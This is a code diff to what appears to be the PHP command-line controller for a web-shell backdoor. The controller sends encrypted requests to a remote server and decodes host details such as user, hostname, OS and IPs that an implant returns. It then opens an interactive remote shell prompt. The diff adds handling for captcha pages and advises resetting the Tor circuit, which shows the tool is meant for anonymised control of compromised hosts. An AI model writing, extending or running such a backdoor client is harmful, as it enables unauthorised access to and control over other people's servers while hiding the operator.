@@ -1,6 +1,7 @@
 #!/usr/bin/env php
 <?php
 include './functions.php';
+include './banners.php';
 
 $version = "2.0";
 
@@ -29,7 +30,7 @@ if (!is_json_valid($config)) {
     exit(-1);
 }
 
-echo "\n [+] The json file is valid.\n";
+echo " [+] The json file is valid.\n";
 
 $key      = trim($config['key']);
 $iv       = trim($config['iv']);
@@ -71,23 +72,27 @@ $result = send_request($url, array(
 if ($result['status'] == 200) {
     echo "Good.\n";
     echo " [+] Let's parse the host information... ";
-    $response    = json_decode(encrypt_decrypt('decrypt', $result['content'], $key, $iv), true);
-    $username    = base64_decode($response['user']);
-    $path        = base64_decode($response['path']);
-    $hostname    = base64_decode($response['hostname']);
-    $php_version = base64_decode($response['php']);
-    $os          = base64_decode($response['os']);
-    $info        = base64_decode($response['server']);
-    $time        = base64_decode($response['time']);
-    $ip          = base64_decode($response['ip']);
-    $client_ip   = base64_decode($response['client_ip']);
-    $tools       = explode('|', base64_decode($response['tools']));
-    unset($response);
-    if (strlen($time) != 0) {
-        $continue = true;
-        echo "Done.\n";
+    if(strpos($result['content'],'captcha') === false){
+        $response    = json_decode(encrypt_decrypt('decrypt', $result['content'], $key, $iv), true);
+        $username    = base64_decode($response['user']);
+        $path        = base64_decode($response['path']);
+        $hostname    = base64_decode($response['hostname']);
+        $php_version = base64_decode($response['php']);
+        $os          = base64_decode($response['os']);
+        $info        = base64_decode($response['server']);
+        $time        = base64_decode($response['time']);
+        $ip          = base64_decode($response['ip']);
+        $client_ip   = base64_decode($response['client_ip']);
+        $tools       = explode('|', base64_decode($response['tools']));
+        unset($response);
+        if (strlen($time) != 0) {
+            $continue = true;
+            echo "Done.\n";
+        } else {
+            echo "Failed.\n";
+        }
     } else {
-        echo "Failed.\n";
+        echo "Failed, some Captcha was found, try to reset the Tor circuit...\n";
     }
 }
 
@@ -98,9 +103,10 @@ echo " [+] Opening the shell... \n";
 sleep(1);
 print_banner();
 echo "\n";
-echo "Server IP : \e[1m{$ip}\e[0m | Your IP : \e[1m{$client_ip}\e[0m\n";
-echo "Time @ Server : \e[1m{$time}\e[0m\n";
-echo "\e[1m{$os}\e[0m\n\e[1m{$info}\e[0m\n";
+echo "\e[37mServer IP\t:=\e[0m \e[97m{$ip}\e[0m\t\n\e[37mClient IP\t:=\e[0m \e[97m{$client_ip}\e[0m\n";
+echo "\e[37mTime @ Server\t:=\e[0m \e[97m{$time}\e[0m\n";
+echo "\e[37mInformation\t:=\e[0m \e[97m".strtoupper($os)."\e[0m\n";
+echo "\e[37mWeb Server\t:=\e[0m \e[97m".strtoupper($info)."\e[0m\n";
 echo "\n";
 do {
     $prefix = "\e[91m{$username}\e[0m@\e[33m{$hostname}\e[0m:\e[94m{$path}\e[0m$ ";
